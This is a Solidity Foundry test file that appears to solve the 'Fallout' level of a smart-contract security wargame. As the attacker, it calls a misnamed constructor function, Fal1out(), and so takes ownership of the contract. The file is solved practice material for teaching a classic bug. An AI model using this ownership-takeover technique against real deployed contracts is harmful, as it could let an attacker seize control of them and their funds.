// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/Fallout/Level.sol";
import "forge-std/console.sol";

interface IFallout {
    function Fal1out() external payable;

    function owner() external view returns(address);
}

contract FalloutTest is Test {
    IFallout fallout;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        fallout = IFallout(address(new Fallout()));
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        fallout.Fal1out(); // is that a constructor, LOL ?
        /* Write your code here */ 

        /* Validating the test */
        assertEq(fallout.owner(), attacker);
    }
}
